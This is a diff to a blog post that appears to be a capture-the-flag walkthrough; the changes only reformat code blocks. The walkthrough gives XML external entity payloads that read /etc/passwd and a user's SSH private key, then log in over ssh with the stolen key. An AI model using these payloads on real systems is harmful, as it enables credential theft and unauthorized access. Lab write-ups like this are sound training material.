@@ -195,14 +195,14 @@ Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcap
 
 Use `firefox` to load url `http://<ip>` and try the below payloads.
 
-{% raw %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+{% capture code %}{% raw %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
     <userInfo>
         <firstName>falcon</firstName>
         <lastName>&name;</lastName>
-    </userInfo>{% endraw %}
+    </userInfo>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
-{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>{% endraw %}
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
@@ -212,12 +212,12 @@ The first payload will display `falcon feast` and the second payload will displa
 Use `firefox` to load the url `http://<ip>`
 
 Use the following payloads to get the contents of `/etc/passwd`.
-{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>{% endraw %}
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
 There is one non-system user. Use the following payload to read the user's rsa private key.
-{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&read;</root>{% endraw %}
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
